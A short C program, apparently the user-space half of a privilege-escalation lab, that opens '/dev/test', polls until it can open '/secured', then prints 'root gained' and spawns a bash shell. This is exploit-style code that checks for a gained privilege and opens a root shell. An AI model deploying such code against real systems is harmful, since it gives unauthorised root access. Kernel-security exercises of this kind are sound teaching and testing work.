#include <fcntl.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
	int d = open("/dev/test", O_RDWR);

	for(;;) {
		if(open("/secured", O_RDWR) >= 0) {
			printf("root gained\n");
			system("bash");
			return 1;
		}
		perror("/secured: ");
		usleep(100 * 1000);
	}
}
